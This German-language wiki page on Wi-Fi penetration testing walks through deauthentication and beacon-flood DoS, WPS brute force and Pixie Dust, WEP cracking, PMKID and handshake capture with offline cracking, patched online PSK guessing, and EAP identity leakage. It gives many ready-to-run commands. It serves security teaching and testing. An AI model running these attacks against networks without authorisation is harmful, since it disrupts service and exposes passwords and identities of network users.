# Pentesting WLAN

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende WLAN-Befehle
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Werkzeuge

### Hijacker & NexMon (Android internes Wi‑Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Airgeddon mit docker ausführen**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Es kann Evil Twin-, KARMA- und Known Beacons-Angriffe durchführen und anschließend eine phishing template verwenden, um das echte network password zu erlangen oder social network credentials abzufangen.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Dieses Tool automatisiert **WPS/WEP/WPA-PSK**-Angriffe. Es wird automatisch:

- Setzt die Schnittstelle in den Monitor-Modus
- Sucht nach möglichen Netzwerken und lässt dich die(n) Ziel(e) auswählen
- Wenn WEP - startet WEP-Angriffe
- Wenn WPA-PSK
- Wenn WPS: Pixie dust attack und der bruteforce attack (Vorsicht: der bruteforce attack kann lange dauern). Beachte, dass es nicht null PIN oder database/generated PINs versucht.
- Versucht, die PMKID vom AP zu capture, um sie zu cracken
- Versucht, Clients des AP zu deauthenticate, um einen handshake zu capture
- Wenn PMKID oder Handshake vorhanden sind, versucht es, sie per bruteforce mit top5000 passwords zu knacken

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Trennt alle (oder eine bestimmte ESSID/Client)
- Random fake APs -- Netze verbergen, möglicherweise Scanner zum Absturz bringen
- Overload AP -- Versucht, den AP lahmzulegen (meist nicht sehr nützlich)
- WIDS -- Mit dem IDS spielen
- TKIP, EAPOL -- Einige spezifische Angriffe, um einige APs per DoS anzugreifen
- **Cracking**
- Crack **WEP** (mehrere Tools und Methoden)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Nützlich, um captive portal creds zu capture und/oder LAN-Angriffe durchzuführen
- **WPA-PSK** Evil Twin -- Nützlich für Netzwerkangriffe, wenn du das Passwort kennst
- **WPA-MGT** -- Nützlich, um company credentials zu capture
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Nützlich, um captive portal creds zu capture und/oder LAN-Angriffe durchzuführen
- **+ WPA** -- Nützlich, um WPA handshakes zu capture

## Open / OWE networks quick notes

- **Passive capture** on open SSIDs still works with monitor mode and tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) führt einen pro-Stationen Schlüsselaustausch durch (kein PSK), sodass Funk-Frames sogar bei "offenen" SSIDs verschlüsselt sind. Da es auf WPA3 basiert, erzwingt es außerdem **802.11w PMF**, das gefälschte deauth/disassoc frames blockiert.
- OWE **authentifiziert Beitretende nicht**: jeder kann sich assoziieren, also **prüfen Sie die Client-Isolation** statt sich auf Marketingaussagen zu verlassen. Ohne Isolation funktionieren weiterhin ARP spoofing oder responder-style poisoning auf dem lokalen L2.
- **Evil Twin** bleibt auf offenen/OWE SSIDs durch das Präsentieren eines stärkeren Signals weiterhin möglich; PMF entfernt nur die deauth-Abkürzung. Wenn Opfer ein gefälschtes TLS-Zertifikat akzeptieren, ist ein vollständiges HTTP(S) MitM wieder möglich.
- Broadcast poisoning auf offenen Gast-Wi‑Fi-Netzen liefert leicht Creds/Hashes (LLMNR/NBT-NS/mDNS). Siehe:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Beschreibung von** [**hier**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication**-Angriffe, eine verbreitete Methode im Wi‑Fi‑Hacking, bestehen darin, "management" Frames zu fälschen, um **Geräte zwangsweise von einem Netzwerk zu trennen**. Diese unverschlüsselten Pakete täuschen Clients vor, sie stammten vom legitimen Netzwerk, wodurch Angreifer WPA handshakes zum Knacken sammeln oder Verbindungen dauerhaft stören können. Diese Taktik, beunruhigend in ihrer Einfachheit, wird weit verbreitet eingesetzt und hat erhebliche Auswirkungen auf die Netzwerksicherheit.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 bedeutet deauthentication
- 1 ist die Anzahl der zu sendenden deauths (du kannst mehrere senden, wenn du möchtest); 0 bedeutet, sie kontinuierlich zu senden
- -a 00:14:6C:7E:40:80 ist die MAC-Adresse des Access Point
- -c 00:0F:B5:34:30:30 ist die MAC-Adresse des Client, der zu deauthenticate ist; wenn dies weggelassen wird, wird eine broadcast deauthentication gesendet (funktioniert nicht immer)
- ath0 ist der Interface-Name

### Disassociation Packets

**Disassociation packets**, ähnlich wie deauthentication packets, sind eine Art Management-Frame, der in Wi‑Fi-Netzen verwendet wird. Diese Pakete dienen dazu, die Verbindung zwischen einem Gerät (z. B. einem Laptop oder Smartphone) und einem Access Point (AP) zu trennen. Der Hauptunterschied zwischen disassociation und deauthentication liegt in ihren Einsatzszenarien. Während ein AP **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, Neustart oder Umzug sendet und dadurch die Trennung aller verbundenen Knoten notwendig wird.

**Dieser Angriff kann mit mdk4(mode "d") durchgeführt werden:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mehr DOS-Angriffe von mdk4**

**Siehe** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Sendet beacon frames, um fake APs bei clients vorzutäuschen. Dies kann manchmal network scanners und sogar drivers zum Absturz bringen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Das Senden von authentication frames an alle erreichbaren Access Points (APs) in Reichweite kann diese APs überlasten, insbesondere wenn viele Clients beteiligt sind. Dieser intensive traffic kann zu Systeminstabilität führen, sodass einige APs einfrieren oder sogar neu starten.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing von Access Points (APs) überprüft, ob eine SSID korrekt angezeigt wird und bestätigt die Reichweite des APs. Diese Technik, kombiniert mit **bruteforcing hidden SSIDs** mit oder ohne Wordlist, hilft dabei, versteckte Netzwerke zu identifizieren und zu erreichen.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Das Senden zufälliger oder doppelter Pakete an verschiedene QoS-Queues kann Michael Countermeasures auf **TKIP APs** auslösen und zu einer einminütigen Abschaltung des APs führen. Diese Methode ist eine effiziente **DoS** (Denial of Service) Angriffstaktik.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Das Fluten eines AP mit **EAPOL Start frames** erzeugt **fake sessions**, überlastet den AP und blockiert legitime clients. Alternativ bewirkt das Injizieren von **fake EAPOL Logoff messages**, dass clients zwangsweise getrennt werden; beide Methoden stören effektiv den Netzwerkdienst.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Angriffe auf IEEE 802.11s Mesh-Netzwerke**

Verschiedene Angriffe auf Link-Management und Routing in Mesh-Netzwerken.

**ATTACK MODE w: WIDS-Verwirrung**

Cross-connecting von Clients zu mehreren WDS nodes oder gefälschten rogue APs kann Intrusion Detection and Prevention Systems manipulieren, Verwirrung stiften und potenziellen Systemmissbrauch ermöglichen.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Ein packet fuzzer mit verschiedenen packet sources und einem umfassenden Satz an Modifikatoren zur Paketmanipulation.

### **Airggedon**

_**Airgeddon**_ bietet die meisten der zuvor vorgeschlagenen Angriffe:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereinfacht den Prozess, Geräte mit einem Router zu verbinden, und erhöht die Geschwindigkeit und Einfachheit der Einrichtung für Netzwerke, die mit **WPA** oder **WPA2** Personal verschlüsselt sind. Es ist wirkungslos gegenüber der leicht kompromittierbaren WEP-Sicherheit. WPS verwendet eine 8-stellige PIN, die in zwei Hälften validiert wird, was es anfällig für brute-force attacks macht, da die Anzahl der Kombinationen begrenzt ist (11.000 Möglichkeiten).

### WPS Bruteforce

Es gibt 2 Haupt-Tools, um diese Aktion durchzuführen: Reaver und Bully.

- **Reaver** wurde entwickelt, um ein robustes und praktisches Angriffswerkzeug gegen WPS zu sein, und wurde gegen eine Vielzahl von access points und WPS-Implementierungen getestet.
- **Bully** ist eine **neue Implementierung** des WPS brute force attack, geschrieben in C. Es hat mehrere Vorteile gegenüber dem ursprünglichen reaver code: weniger Abhängigkeiten, verbesserte Speicher- und CPU-Leistung, korrekte Behandlung der endianness und ein robusteres Optionsset.

Der Angriff nutzt die **WPS PIN's vulnerability** aus, insbesondere die Offenlegung der ersten vier Ziffern und die Rolle der letzten Ziffer als Prüfsumme, was den brute-force attack erleichtert. Verteidigungen gegen brute-force attacks, wie das **blocking MAC addresses** von aggressiven Angreifern, verlangen jedoch eine **MAC address rotation**, um den Angriff fortzusetzen.

Nachdem der Angreifer die WPS PIN mit Tools wie Bully oder Reaver erhalten hat, kann er den WPA/WPA2 PSK ableiten und damit **persistent network access** sicherstellen.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Dieser verfeinerte Ansatz zielt auf WPS PINs ab und nutzt bekannte Schwachstellen:

1. **Bereits bekannte PINs**: Verwenden Sie eine Datenbank bekannter PINs, die bestimmten Herstellern zugeordnet sind, die einheitliche WPS PINs verwenden. Diese Datenbank verknüpft die ersten drei Oktette der MAC-addresses mit den wahrscheinlichsten PINs für diese Hersteller.
2. **PIN-Generierungsalgorithmen**: Nutzen Sie Algorithmen wie ComputePIN und EasyBox, die WPS PINs basierend auf der MAC-address des AP berechnen. Der Arcadyan algorithm benötigt zusätzlich eine device ID, wodurch ein weiterer Schritt im PIN-Generierungsprozess entsteht.

### WPS Pixie Dust attack

**Dominique Bongard** entdeckte eine Schwachstelle in einigen Access Points (APs) bei der Erstellung von Geheimcodes, bekannt als **nonces** (**E-S1** und **E-S2**). Wenn diese nonces ermittelt werden können, wird das Cracking der WPS PIN des APs einfach. Der AP gibt die PIN in einem speziellen Code (hash) preis, um zu beweisen, dass er legitim und kein gefälschter (rogue) AP ist. Diese nonces sind im Wesentlichen die "Schlüssel" zum Öffnen des "Tresors", der die WPS PIN enthält. Mehr dazu finden Sie [hier](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Einfach ausgedrückt besteht das Problem darin, dass einige APs bei der Verschlüsselung der PIN während des Verbindungsprozesses nicht ausreichend zufällige Schlüssel verwendet haben. Dadurch ist die PIN anfällig für Erraten von außerhalb des Netzwerks (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Wenn du das Gerät nicht in den monitor mode versetzen möchtest oder `reaver` und `bully` Probleme bereiten, kannst du [OneShot-C](https://github.com/nikita-yfh/OneShot-C) ausprobieren. Dieses Tool kann eine Pixie Dust attack ausführen, ohne in den monitor mode wechseln zu müssen.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Einige schlecht designte Systeme erlauben sogar, dass eine **Null PIN** (eine leere oder nicht vorhandene PIN) Zugriff gewährt, was ziemlich ungewöhnlich ist. Das Tool **Reaver** kann auf diese Schwachstelle testen, im Gegensatz zu **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 und 6 erlauben dir, **deinen eigenen PIN** zu testen (falls vorhanden)
- 7 und 8 führen die **Pixie Dust attack** aus
- 13 erlaubt dir, den **NULL PIN** zu testen
- 11 und 12 werden **die mit dem ausgewählten AP verknüpften PINs aus verfügbaren Datenbanken zusammentragen** und mögliche **PINs** generieren mit: ComputePIN, EasyBox und optional Arcadyan (empfohlen, warum nicht?)
- 9 und 10 testen **jeden möglichen PIN**

## **WEP**

**Warum es zusammenbricht**

- Der RC4-Seed ist einfach **IV (24 bits) + gemeinsamer Schlüssel**. Die IV ist Klartext, winzig (2^24) und wiederholt sich schnell, sodass Chiffretexte mit derselben IV denselben Keystream wiederverwenden.
- XORing zweier Chiffretexte mit demselben Keystream leaks `PlaintextA ⊕ PlaintextB`; vorhersehbare Header + RC4 KSA biases (**FMS**) ermöglichen es, Key-Bytes „abzustimmen“. **PTW** optimiert das, indem ARP-Traffic genutzt wird, wodurch die Anforderungen von Millionen auf Zehntausende Pakete sinken.
- Die Integrität besteht nur aus **CRC32** (linear/unkeyed), sodass ein Angreifer Bits umdrehen und CRC32 ohne Schlüssel neu berechnen kann → packet forgery/replay/ARP injection, während er auf IVs wartet.

Der praktische Bruch ist deterministisch:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon bietet weiterhin einen "All-in-One" WEP-Workflow, wenn du eine geführte UI bevorzugst.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018 hat **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) eine neue Angriffsmethode vorgestellt, die einzigartig ist, weil sie nur **ein einziges Paket** benötigt und nicht erfordert, dass Clients mit dem Ziel-AP verbunden sind — es reicht eine Interaktion zwischen Angreifer und AP.

Viele moderne Router fügen während der Association dem **ersten EAPOL** Frame ein **optionales Feld** hinzu, bekannt als `Robust Security Network`. Dieses enthält den `PMKID`.

Wie im ursprünglichen Beitrag erklärt, wird der **PMKID** aus bekannten Daten erstellt:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Da der "PMK Name" konstant ist, die BSSID des AP und der Station bekannt sind und das `PMK` identisch mit dem aus einem vollständigen 4-way handshake ist, kann **hashcat** diese Informationen verwenden, um den PSK zu cracken und die Passphrase wiederherzustellen!

Um diese Informationen zu **sammeln** und das Passwort lokal per **bruteforce** zu ermitteln, kannst du Folgendes tun:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs captured** werden in der **Konsole** angezeigt und außerdem **gespeichert** in \_ **/tmp/attack.pcap**\_\
Konvertiere nun die Capture in das **hashcat/john**-Format und cracke sie:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Bitte beachten Sie, dass das Format eines korrekten hash **4 Teile** enthält, z. B.: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Wenn Ihrer **nur** **3 Teile** enthält, dann ist er **ungültig** (die PMKID capture war nicht gültig).

Beachten Sie, dass `hcxdumptool` **also capture handshakes** (etwas in der Art wird erscheinen: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Sie können die **handshakes** mit `cap2hccapx` in das **hashcat**/**john**-Format **transformieren**.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ich habe festgestellt, dass einige handshakes, die mit diesem Tool erfasst wurden, selbst bei bekanntem korrektem password nicht cracked werden konnten. Ich empfehle, handshakes nach Möglichkeit auch auf traditionelle Weise zu erfassen oder mehrere davon mit diesem Tool aufzunehmen._

### Handshake capture

Ein Angriff auf **WPA/WPA2**-Netzwerke kann durchgeführt werden, indem ein **handshake** erfasst und versucht wird, das **password** **offline** zu **crack**en. Dieser Prozess beinhaltet das Überwachen der Kommunikation eines bestimmten Netzwerks und der **BSSID** auf einem bestimmten **channel**. Hier ist eine vereinfachte Anleitung:

1. Identifiziere die **BSSID**, **channel**, und einen **connected client** des Zielnetzwerks.
2. Verwende `airodump-ng`, um den Netzwerkverkehr auf dem angegebenen **channel** und der **BSSID** zu überwachen, in der Hoffnung, einen handshake zu erfassen. Der Befehl sieht ungefähr so aus:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Um die Chance zu erhöhen, einen handshake zu erfassen, trenne den Client kurz vom Netzwerk, um eine erneute Authentifizierung zu erzwingen. Dies kann mit dem Befehl `aireplay-ng` erfolgen, der deauthentication packets an den Client sendet:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Sobald in `airodump-ng` einige handshake Informationen erscheinen, bedeutet das, dass der handshake erfasst wurde und du mit dem Zuhören aufhören kannst:

![](<../../images/image (172) (1).png>)

Sobald der handshake erfasst wurde, kannst du ihn mit `aircrack-ng` **crack**:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Prüfen, ob ein Handshake in der Datei vorhanden ist

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Wenn dieses Tool einen unvollständigen handshake einer ESSID findet, bevor der vollständige vorhanden ist, erkennt es den gültigen handshake nicht._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Schnelleres Online-PSK-Raten via `wpa_supplicant` ctrl socket (keine clients/PMKID)

Wenn keine clients in der Nähe sind und der AP PMKID ablehnt, kannst du PSKs online iterieren, ohne supplicants neu zu starten:

- Patch `wpa_supplicant.c`, um `dur = 0;` in der auth failure backoff logic (etwa um `ssid->auth_failures`) zu erzwingen — dadurch wird der temporary-disable-Timer effektiv deaktiviert.
- Starte einen einzelnen daemon mit einem control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Steuere es über die Steueroberfläche und verwende dabei denselben Scan und dasselbe Netzwerk:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Eine kleine Python-Schleife, die Socket-Ereignisse liest (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`), kann etwa 100 Versuche in ~5 Minuten testen, ohne Scan-Overhead. Sie ist zwar weiterhin laut und erkennbar, vermeidet jedoch Prozessneustarts pro Versuch und Backoff-Verzögerungen.

## **WPA Enterprise (MGT)**

In **Enterprise-WiFi-Umgebungen stoßen Sie auf verschiedene Authentifizierungsverfahren**, die jeweils unterschiedliche Sicherheitsniveaus und Verwaltungsfunktionen bieten. Wenn Sie Tools wie `airodump-ng` zur Analyse des Netzwerkverkehrs verwenden, können Ihnen Kennungen für diese Authentifizierungstypen auffallen. Einige gängige Methoden sind:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Diese Methode unterstützt hardware tokens und one-time passwords innerhalb von EAP-PEAP. Im Gegensatz zu MSCHAPv2 verwendet sie kein peer challenge und sendet Passwörter im plaintext an den access point, was ein Risiko für downgrade attacks darstellt.
2. **EAP-MD5 (Message Digest 5)**:
- Bedeutet, dass der Client den MD5-Hash des Passworts sendet. Es wird **nicht empfohlen** aufgrund der Anfälligkeit für dictionary attacks, fehlender server authentication und der Unfähigkeit, session-specific WEP keys zu erzeugen.
3. **EAP-TLS (Transport Layer Security)**:
- Nutzt sowohl client-side als auch server-side certificates zur Authentifizierung und kann dynamisch user-based und session-based WEP keys zur Sicherung der Kommunikation generieren.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Bietet gegenseitige Authentifizierung über einen encrypted tunnel sowie eine Methode zur Ableitung dynamischer, per-user, per-session WEP keys. Es erfordert nur server-side certificates, während Clients Credentials verwenden.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funktioniert ähnlich wie EAP, indem ein TLS tunnel für geschützte Kommunikation erstellt wird. Dadurch ist es möglich, schwächere authentication protocols über EAP zu verwenden, da der Tunnel Schutz bietet.
- **PEAP-MSCHAPv2**: Oft einfach als PEAP bezeichnet, kombiniert es den verwundbaren MSCHAPv2 challenge/response-Mechanismus mit einem schützenden TLS tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Ähnlich wie EAP-TLS, leitet aber einen TLS tunnel ein, bevor Zertifikate ausgetauscht werden, und bietet damit eine zusätzliche Sicherheitsebene.

Weitere Informationen zu diesen authentication methods finden Sie [hier ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) und [hier](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Beim Lesen von [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) ergibt sich, dass wenn man **EAP** verwendet, die **"Identity"** **messages** unterstützt werden müssen und der **username** in **clear** in den **"Response Identity"**-Messages gesendet wird.

Selbst bei einer der sichersten Authentifizierungsmethoden: **PEAP-EAP-TLS**, ist es möglich, **den im EAP-Protokoll gesendeten username zu capture**. Dazu eine authentication communication capturen (starte `airodump-ng` auf einem Kanal und `wireshark` auf derselben Schnittstelle) und filtere die Pakete nach `eapol`.\
Innerhalb des "**Response, Identity**"-Pakets erscheint der **username** des Clients.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding wird sowohl von EAP-PEAP als auch von EAP-TTLS unterstützt. Im Kontext eines WiFi-Netzes wird eine EAP-Identity-Anfrage typischerweise vom access point (AP) während des Association-Prozesses initiiert. Um die Anonymität des Benutzers zu schützen, enthält die Antwort des EAP-Clients auf dem Gerät des Benutzers nur die erforderlichen Informationen, die der initiale RADIUS-Server zur Verarbeitung der Anfrage benötigt. Dieses Konzept lässt sich durch die folgenden Szenarien veranschaulichen:

- EAP-Identity = anonymous
- In diesem Szenario verwenden alle Benutzer die pseudonyme Kennung "anonymous" als ihren Benutzeridentifikator. Der initiale RADIUS-Server fungiert entweder als EAP-PEAP- oder EAP-TTLS-Server und ist für die Verwaltung der server-side des PEAP- oder TTLS-Protokolls verantwortlich. Die inner (protected) authentication method wird dann entweder lokal gehandhabt oder an einen entfernten (home) RADIUS-Server delegiert.
- EAP-Identity = anonymous@realm_x
- In diesem Fall verbergen Benutzer aus verschiedenen Realms ihre Identitäten, geben aber ihren jeweiligen Realm an. Dadurch kann der initiale RADIUS-Server die EAP-PEAP- oder EAP-TTLS-Anfragen an RADIUS-Server in ihren home realms proxyen, die dann als PEAP- oder TTLS-Server agieren. Der initiale RADIUS-Server fungiert dabei ausschließlich als RADIUS-Relay-Node.
- Alternativ kann der initiale RADIUS-Server als EAP-PEAP- oder EAP-TTLS-Server fungieren und entweder die protected authentication method selbst behandeln oder sie an einen anderen Server weiterleiten. Diese Option ermöglicht die Konfiguration unterschiedlicher Richtlinien für verschiedene Realms.

Bei EAP-PEAP, sobald der TLS tunnel zwischen dem PEAP server und dem PEAP client etabliert ist, initiiert der PEAP server eine EAP-Identity-Anfrage und sendet diese durch den TLS tunnel. Der Client antwortet auf diese zweite EAP-Identity-Anfrage, indem er eine EAP-Identity-Antwort mit der wahren Identität des Benutzers durch den verschlüsselten Tunnel sendet. Dieser Ansatz verhindert effektiv, dass die tatsächliche Identität des Benutzers von jemandem, der den 802.11-Verkehr abhört, offengelegt wird.

EAP-TTLS folgt einem leicht anderen Verfahren. Bei EAP-TTLS authentifiziert sich der Client typischerweise mit PAP oder CHAP, geschützt durch den TLS tunnel. In diesem Fall enthält der Client ein User-Name-Attribut und entweder ein Password- oder CHAP-Password-Attribut in der initialen TLS-Nachricht, die nach der Tunnel-Etabliernung gesendet wird.

Unabhängig vom gewählten Protokoll erlangt der PEAP/TTLS-Server Kenntnis der wahren Identität des Benutzers, nachdem der TLS tunnel etabliert wurde. Die wahre Identität kann als user@realm oder einfach user dargestellt werden. Wenn der PEAP/TTLS-Server auch für die Authentifizierung des Benutzers verantwortlich ist, besitzt er nun die Identität des Benutzers und fährt mit der durch den TLS tunnel geschützten Authentifizierungsmethode fort. Alternativ kann der PEAP/TTLS-Server eine neue RADIUS-Anfrage an den home RADIUS-Server des Benutzers weiterleiten. Diese neue RADIUS-Anfrage lässt die PEAP- oder TTLS-Protokollschicht weg. In Fällen, in denen die protected authentication method EAP ist, werden die inner EAP-Nachrichten an den home RADIUS-Server ohne den EAP-PEAP- oder EAP-TTLS-Wrapper weitergeleitet. Das User-Name-Attribut der ausgehenden RADIUS-Nachricht enthält dann die wahre Identität des Benutzers und ersetzt das anonyme User-Name aus der eingehenden RADIUS-Anfrage. Wenn die protected authentication method PAP oder CHAP ist (nur von TTLS unterstützt), werden das User-Name- und andere Authentifizierungsattribute, die aus dem TLS-Payload extrahiert wurden, in der ausgehenden RADIUS-Nachricht eingefügt und ersetzen das anonyme User-Name und die TTLS EAP-Message-Attribute aus der eingehenden RADIUS-Anfrage.

Für mehr Infos siehe [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-basierte Wi‑Fi-Authentifizierung mit EAP‑SIM/EAP‑AKA über 802.1X kann die permanente Subscriber-Identifier (IMSI) im Klartext während der unauthenticated identity phase leaken, wenn die Deployment keine pseudonyms/protected identities implementiert oder keinen TLS tunnel um das innere EAP legt.

Wo der leak passiert (high level):
- 802.11 association completes to the SSID (oft carrier offload SSIDs wie FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
